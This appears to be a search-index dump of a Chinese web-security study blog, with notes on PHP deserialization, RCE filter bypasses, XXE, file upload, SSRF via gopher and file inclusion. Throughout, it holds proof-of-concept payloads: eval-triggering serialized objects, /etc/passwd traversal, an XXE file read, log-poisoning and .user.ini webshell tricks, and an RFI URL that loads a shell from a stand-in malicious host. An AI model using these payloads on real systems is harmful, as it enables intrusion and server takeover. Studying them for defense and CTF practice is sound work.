[{"title":"PHP反序列化","url":"/2025/07/19/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"PHP \nserialize() 函数serialize() 函数用于序列化对象或数组，并返回一个字符串。\nserialize() 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。\n反序列化漏洞是基于序列化和反序列化的操作，在反序列化——unserialize()时存在用户可控参数，而反序列化会自动调用一些魔术方法，如果魔术方法内存在一些敏感操作例如eval()函数，而且参数是通过反序列化产生的，那么用户就可以通过改变参数来执行敏感操作，这就是反序列化漏洞。\n$source = &quot;helloworld&quot;; echo serialize($source);\n\n在浏览器显示：s:10:“helloworld”\nunserialize()函数$source = &#x27;a:2:&#123;i:0;s:8:&quot;shandong&quot;;i:1;s:5:&quot;jinan&quot;;&#125;&#x27;;$array = unserialize($source);var_dump($array);\n\n\n浏览器以原数组的方式展现出来：array(2) { [0]&#x3D;&gt; string(8) “shandong” [1]&#x3D;&gt; string(5) “jinan” }\n魔术方法在PHP反序列化的过程中会自动执行一些魔术方法，完整列表如下：方法名调用条件___call调用不可访问或不存在的方法时被调用 __call($name, $args)__callStatic调用不可访问或不存在的静态方法时被调用___clone进行对象clone时被调用，用来调整对象的克隆行为_constuct构建对象的时被调用；__debuginfo当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本___destruct明确销毁对象或脚本结束时被调用；___get读取不可访问或不存在属性时被调用___invoke当以函数方式调用对象时被调用___isset对不可访问或不存在的属性调用isset()或empty()时被调用___set当给不可访问或不存在属性赋值时被调用___set_state当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。___sleep当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用___toString当一个类被转换成字符串时被调用___unset对不可访问或不存在的属性进行unset时被调用___wakeup当使用unserialize时被调用，可用于做些对象的初始化操作\n反序列化漏洞存在反序列化漏洞的代码新建一个PHP源文件，命名为：usdemo.php2、如何利用该反序列化漏洞（1）先分析代码的结构，值如何传入，什么情况下会被调用，被调用后是什么结果（2）由于反序列化后输出结果通常是比较复杂的结构，人为构造是很容易出错且几乎不可能的事情，所以我们需要自己编写一个与漏洞代码相同的类名，相同的属性，甚至相同代码的类，用于生成序列化后的字符串新建一个PHP源文件，命令为uspoc.php&#x2F;&#x2F; 构造漏洞利用的POC，并输出反序列化后的结果\n￼class Test &#123;    public $phone = &#x27;&#x27;;    var $ip = &#x27;&#x27;;&#125;$t = new Test();$t-&gt;phone = &#x27;phpinfo();&#x27;;$t-&gt;ip = &#x27;127.0.0.2&#x27;;echo serialize($t);\n\n\n2、如何利用该反序列化漏洞（1）先分析代码的结构，值如何传入，什么情况下会被调用，被调用后是什么结果（2）由于反序列化后输出结果通常是比较复杂的结构，人为构造是很容易出错且几乎不可能的事情，所以我们需要自己编写一个与漏洞代码相同的类名，相同的属性，甚至相同代码的类，用于生成序列化后的字符串新建一个PHP源文件，命令为uspoc.php&#x2F;&#x2F; 构造漏洞利用的POC，并输出反序列化后的结果\n（3）从下图POC代码中获取到反序列化的结果，再将该结果提交给漏洞代码的code参数，完成利用http://xxx.xxx.xxx.xx/security/unserial/usdemo.php?code=O:6:&quot;USDemo&quot;:1:{s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;}\nclass USDemo &#123;    var $code = &#x27;phpinfo();&#x27;;   // 直接填充要执行的命令体    function __destruct() &#123;        @eval($this-&gt;code);    &#125;&#125;$utp = new USDemo();echo serialize($utp);   // 输出为：O:6:&quot;USDemo&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;\n\n\n\n（3）从上述POC代码中获取到反序列化的结果，再将该结果提交给漏洞代码的code参数，完成利用http://xxx.xxx.xxx.xx/security/unserial/usdemo.php?code=O:6:&quot;USDemo&quot;:1:{s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;}\n（3）从上述POC代码中获取到反序列化的结果，再将该结果提交给漏洞代码的code参数，完成利用http://xxx.xxx.xxx.xx/security/unserial/usdemo.php?code=O:6:&quot;USDemo&quot;:1:{s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;}\nclass USDemo &#123;    var $code = &#x27;phpinfo();&#x27;;   // 直接填充要执行的命令体    function __destruct() &#123;        @eval($this-&gt;code);    &#125;&#125;$utp = new USDemo();echo serialize($utp);   // 输出为：O:6:&quot;USDemo&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;\n\n（3）从上述POC代码中获取到反序列化的结果，再将该结果提交给漏洞代码的code参数，完成利用http://xxx.xxx.xxx.xx/security/unserial/usdemo.php?code=O:6:&quot;USDemo&quot;:1:{s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;}\nPHP反序列化基础利用链漏洞代码class kaiser &#123;    var $a;    function __construct() &#123;        $this-&gt;a = new Test();    &#125;    function __destruct() &#123;        $this-&gt;a-&gt;hello();    &#125;&#125;class Test &#123;    function hello() &#123;        echo &quot;Hello World.&quot;;    &#125;&#125;class Vul &#123;    var $data;    function hello() &#123;        @eval($this-&gt;data);    &#125;&#125;unserialize($_GET[&#x27;code&#x27;]);\n\npocclass kaiser &#123;    var $a;    function __construct() &#123;        $this-&gt;a = new Vul();    &#125;    function __destruct() &#123;        $this-&gt;a-&gt;hello();    &#125;&#125;class Vul &#123;    var $data= &quot;phpinfo();&quot;;    function hello() &#123;        @eval($this-&gt;data);    &#125;    // function __call($name, $args) &#123;    //     $this-&gt;hi();    // &#125;&#125;echo serialize(new kaiser());\n\n简化的pocclass kaiser &#123;    var $a;    function __construct() &#123;        $this-&gt;a = new Vul();    &#125;&#125;class Vul &#123;    // protected $data = &quot;phpinfo();&quot;;    protected $data = &quot;system(&#x27;ifconfig&#x27;);&quot;;&#125;echo urlencode(serialize(new kaiser()));\n\n\n\n反序列化的常用手段1、反序列化的常见起点：（1）__wakeup 一定会调用\n（2）__destruct 一定会调用\n（3）__toString 当一个对象被反序列化后又被当做字符串使用\n2、反序列化的常见中间跳板:（1）__toString 当一个对象被当做字符串使用\n（2）__get 读取不可访问或不存在属性时被调用\n（3）__set 当给不可访问或不存在属性赋值时被调用\n（4）__isset 对不可访问或不存在的属性调用isset()或empty()时被调用，形如 this−&gt;this-&gt;this−&gt;func();\n（5）__call 调用不可访问或不存在的方法时被调用\n3、反序列化的常见终点:（1）call_user_func 一般php代码执行都会选择这里\n（2）call_user_func_array 一般php代码执行都会选择这里\n（3）执行指令、文件操作、执行代码等敏感操作\n"},{"title":"RCE","url":"/2025/08/09/RCE/","content":"参考：渗透测试——命令执行漏洞（RCE）详解 - 知乎\n常见rce函数1.利用系统函数实现命令执行的函数：\neval（）、assert（）、preg_replace（）、call_user_func（） 、如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏 洞 其他函数\nob_start（）、unserialize（）、creat_function（） 、usort（）、uasort（）、uksort（）、  array_filter（）、 array_reduce（）、 array_map（）\n2.直接执行系统命令的代码函数\nsystem（），exec（），shell_exec（），passthru（）， pcntl_exec（）， popen（），  proc_open（），反引号\n常见rce方法php解析漏洞如果服务器错误地解析 .php.jpg 这样的文件，攻击者可以上传伪装的恶意 PHP 代码并执行。\n目录遍历漏洞如果服务器没有正确配置，攻击者可能通过 URL 访问 /etc/passwd 或其他敏感文件：\nhttp://example.com/?file=../../../../etc/passwd\n\nrce： 如果 include() 或 require() 处理用户输入，攻击者可以执行任意 PHP 代码：\nhttp://example.com/include.php?file=../../../../var/www/html/shell.php\n\n Webshell 上传 如果配合 文件上传漏洞，攻击者可以：\n\n上传 shell.php.txt\n通过路径遍历漏洞访问 /uploads/shell.php.txt\n服务器误解析 .txt 为 PHP，导致代码执行\n\n命令联合执行连接符号 连接词\t;\t前面的命令执行完以后，继续执行后面的命令|\t管道符，将上一条命令的输出作为下一条命令的参数（显示后面的执行结果）||\t当前面的命令执行出错时（为假）执行后面的命令&amp;\t将任务置于后台执行&amp;&amp;\t前面的语句为假则直接出错，后面的也不执行，前面只能为真\nrce绕过空格绕过${IFS}$9{IFS}$IFS${IFS}$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行IFS&lt;&lt;&gt;{cat,flag.php}  &#x2F;&#x2F;用逗号实现了空格功能，需要用{}括起来%20   (space)%09   (tab)X&#x3D;$’cat\\x09.&#x2F;flag.php’;$X       （\\x09表示tab，也可以用\\x20）\ncat禁用有时会禁用cat: 解决方法是使用tac反向输出命令： linux命令中可以加\\，所以甚至可以ca\\t &#x2F;fl\\ag\n内联执行在引号写入命令，引号中的命令执行之后的结果会再在反引号之外执行执行（反引号）\ncat ls &#x2F;&#x2F;（显示问题，ls外侧有反引号！！！）cat “ls”所查出来的文件\ncat echo &#39;ZmxhZy5waHA=&#39; | base64 -d&#x2F;&#x2F;先echo这个base64字符串，在用管道符解码这个echo出来的base64（flag.php）然后再 cat解码出来的内容就变成了cat flag.php\n变量拼接针对于服务端的贪婪匹配\nif(preg_match(“&#x2F;.*f.*l.*a.g.&#x2F;“, $ip)){    die(“fxck your flag!”);&#x2F;&#x2F;（参数中是否存在固定顺序的f-l-a-g序列）\n可以a&#x3D;g;cat fla$a.php\n达到绕过效果\n"},{"title":"SSTI基础","url":"/2025/08/10/SSTI%E5%9F%BA%E7%A1%80/","content":"超详细SSTI模板注入漏洞原理讲解_ssti注入-CSDN博客\n"},{"title":"XXE","url":"/2025/08/23/XXE/","content":"XXE：全称为XML Enternal Entity Injection，中文名称：XML外部实体注入。\n漏洞成因：解析时未对XML外部实体加以限制，导致攻击者将恶意代码注入到XML中，导致服务器加载恶意的外部实体引发文件读取，SSRF，命令执行等危害操作。\n特征：在HTTP的Request报文出现一下请求报文，即表明此时是采用XML进行数据传输，就可以测试是否存在XML漏洞。\n文档类型定义（DTD）：可以合法的XML文档构建模块，可以被声明在XML的文档中，也可以作为一个外部的引用。这里也就是XXE存在的地方。\nDTD文档的三种格式：\n内部实体内部实体几乎没有什么利用价值\n&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;例如：&lt;!DOCTYPE foo [\t&lt;!ELEMENT foo ANY &gt;\t&lt;!ENTITY xxe &quot;hello&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n\n外部实体有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以利用如下协议\nfile:///path/to/file.ext\n\nhttp://url/file.extphp://filter/read=convert.base64-encode/resource=conf.php\n\nhttp://url/file.extphp://filter/read=convert.base64-encode/resource=conf.php\n\nXXE漏洞利用XXE 和 SQL注入 的攻击方法也有一点相似，也分有回显和没有回显\n有回显的情况可以直接在页面中看到payload的执行结果或现象，无回显的情况又称为 blind xxe（类似于布尔盲注、时间盲注），可以使用外带数据(OOB)通道提取数据\n文件读取有回显测试源码：\n&lt;?php$xml=simplexml_load_string($_GET[&#x27;xml&#x27;]);print_r((string)$xml);//有回显?&gt;\n\nsimple_load_string解析接收过来的XML代码\npayload:\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM &quot;file:///D://1.txt&quot;&gt;]&gt; &lt;root&gt;&amp;file;&lt;/root&gt;\n\n无回显：加载远程DTD无回显的文件读取可以通过 blind XXE 方法加上外带数据通道（ooB）来提取数据\n先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器来读取数据。\n虽然无法直接查看文件内容，但我们仍然可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码。\npayload：\n"},{"title":"文件上传","url":"/2025/08/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","content":"文件上传漏洞上传文件（如一句话木马）\n\n\n上传到服务器后，通过访问该文件并对进行cmd传参（例如执行系统命令以查看服务器）进行rce。当然使用蚁剑直接看也是更方便的\n文件上传漏洞绕过前端绕过直接修改文件后缀为合适的文件，再进行抓包，修改为正常的php后缀以绕过前端检测\n后端MIME绕过MIME检测：检测请求包中的content-type头可在请求包中修改以绕过。\napache中的.htaccess绕过.htaccess 是 Apache HTTP 服务器中的一个配置文件，用于在目录级别上管理服务器行为。它允许用户在不修改主服务器配置文件的情况下，覆盖全局配置设置。常见的用途包括 URL 重写、访问控制、自定义错误页面等。\n主要功能\n\nURL 重写：通过 mod_rewrite 模块实现 URL 重定向和重写。\n访问控制：限制特定 IP 或用户的访问。\n自定义错误页面：定义 404、500 等错误页面。\nMIME 类型设置：指定文件类型的处理方式。\n缓存控制：设置浏览器缓存策略。\n\nuser.ini文件构成的PHP后门user.ini文件构成的PHP后门 | 离别歌\n使用方法：我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell或者含有木马的图片（这需要服务器的文件解析漏洞）什么的\n直接写在.user.ini中：\nauto_prepend_file=websehll.phporauto_prepend_file=websehll.png\n\n请注意：.user.ini文件仅限于本文件夹以及子文件夹切并非所有php配置都可以又.user.ini进行修改\n"},{"title":"ssrf","url":"/2025/07/22/ssrf/","content":"什么是SSRF漏洞？以及相关SSRF知识：https://cloud.tencent.com/developer/article/2103240\ngopher协议Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；\n发送get请求直接发送一个get请求包，然后根据需要转变为gopher形式\n举例：\nGET &#x2F;ssrf&#x2F;base&#x2F;get.php?name&#x3D;114514 HTTP&#x2F;1.1Host: 192.168.0.109\n经过多次URL编码后变为：（服务器自身会解码）\nGET%20%2Fssrf%2Fbase%2Fget.php%3Fname%3D114514%20HTTP%2F1.1%0AHost%3A%20192.168.0.109\n改写为：\ncurl gopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_GET%20%2Fssrf%2Fbase%2Fget.php%3Fname%3D114514%20HTTP%2F1.1%0AHost%3A%20192.168.0.109%0d%0A\n请注意：\n\n问号（？）需要转码为URL编码，也就是%3f\n回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a\n在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）\n\n在这里curl用于在cmd执行gopher，在powershell改为Invoke-WebRequest。\n发送post请求注意这四个字段必不可少！\nPOST &#x2F;ssrf&#x2F;base&#x2F;post.php HTTP&#x2F;1.1\nHost: 192.168.0.109\nContent-Type: application&#x2F;x-www-form-urlencoded\nContent-Length: 11\n name&#x3D;114514\n转变为\ncurl\ngopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_POST%20%2Fssrf%2Fbase%2Fpost.php%20HTTP%2F1.1%0D%0AHost%3A%20192.168.0.109%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2011%0D%0A%0D%0Aname%3D114514%0D%0A\n随后在命令行进行执行即可\n如果要跟踪302跳转，只需curl -L即可\n"},{"title":"文件包含","url":"/2025/07/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","content":"参考：文件包含漏洞全面详解-CSDN博客\n参考：文件包含漏洞全面详解-CSDN博客\n文件包含什么是文件包含？当应用程序动态地包含外部文件（如脚本、配置文件或其他资源）时，如果未对用户输入进行严格的验证和过滤，攻击者可以通过构造恶意输入，使应用程序包含并执行非预期的文件，从而导致安全风险。\ntip：不需要是一定是php文件，只要含有代码即可被执行，甚至代码可以不需要放在上传的文件中，只要存放在可以被执行的地方即可。\n例如，文件限制只能上传图片，那其实可以在图片中插入php。反正能被执行就好了。\n包含函数在 PHP 中，include 和 require 是用于引入外部文件的两个常用函数。它们的作用是将指定文件的内容插入到当前脚本中，以便复用代码或加载依赖文件。\n1.include 函数\n\n作用：引入指定的文件。如果文件不存在或引入失败，PHP 会发出一个警告（E_WARNING），但脚本会继续执行。\n\n语法：\ninclude &#x27;filename.php&#x27;;\n\n特点：\n\n文件不存在时，脚本不会终止。\n适合引入非核心文件，如模板文件、可选配置文件等。\n\n\n示例：\ninclude &#x27;header.php&#x27;; // 引入 header.php 文件echo &quot;This is the main content.&quot;;include &#x27;footer.php&#x27;; // 引入 footer.php 文件\n\n\n\nrequire 函数\n\n\n作用：引入指定的文件。如果文件不存在或引入失败，PHP 会发出一个致命错误（E_COMPILE_ERROR），并终止脚本执行。\n\n语法：\nphp\n复制\nrequire &#x27;filename.php&#x27;;\n\n特点：\n\n文件不存在时，脚本会终止。\n适合引入核心文件，如类定义、函数库等。\n\n\n示例：\nphp\n复制\nrequire &#x27;config.php&#x27;; // 引入配置文件require &#x27;functions.php&#x27;; // 引入函数库echo &quot;Application started.&quot;;\n\n3.include_once 和 require_once\n\n作用：与 include 和 require 类似，但会检查文件是否已经被引入过。如果已经引入，则不会重复引入。\n\n语法：\ninclude_once &#x27;filename.php&#x27;;require_once &#x27;filename.php&#x27;;\n\n1. 本地文件包含（LFI）\n定义：攻击者通过利用应用程序的文件包含功能，包含并执行服务器本地的文件。\n\n危害：\n\n读取敏感文件（如/etc/passwd、配置文件、日志文件等）。\n执行恶意代码（如果文件内容可被解析，如PHP文件）。\n\n\n示例：\n\n假设一个PHP应用程序有以下代码：\n&lt;?php$file = $_GET[&#x27;file&#x27;];include($file . &#x27;.php&#x27;);?&gt;\n\n攻击者可以通过以下URL读取服务器上的敏感文件：\nhttp://example.com/index.php?file=../../../../etc/passwd\n\n\n\n\n\n日志包含服务器的访问日志在Apache中会被存在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log中；在nginx中会被存在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log中具体存储中包含请求方法，URL，浏览器情况等。因此可以在日志中包含我们的php。\n例如，在user_agent头中修改，改为php木马，则访问&#x2F;var&#x2F;www&#x2F;…&#x2F;access.log头时就可以对php进行触发，达到rce的目的\n2. 远程文件包含（RFI）\n定义：攻击者通过利用应用程序的文件包含功能，包含并执行远程服务器上的文件。\n\n危害：\n\n执行远程恶意代码（如PHP Shell）。\n完全控制服务器。\n\n\n示例：\n\n假设一个PHP应用程序有以下代码：\n&lt;?php$file = $_GET[&#x27;file&#x27;];include($file);?&gt;\n\n攻击者可以通过以下URL包含并执行远程恶意脚本：\nhttp://example.com/index.php?file=http://malicious-site.com/shell.php\n\n如果服务器配置允许远程文件包含，攻击者可以直接在服务器上执行任意代码。\n更多文件包含内容，详见“文件包含”\n\n\n\n\n"}]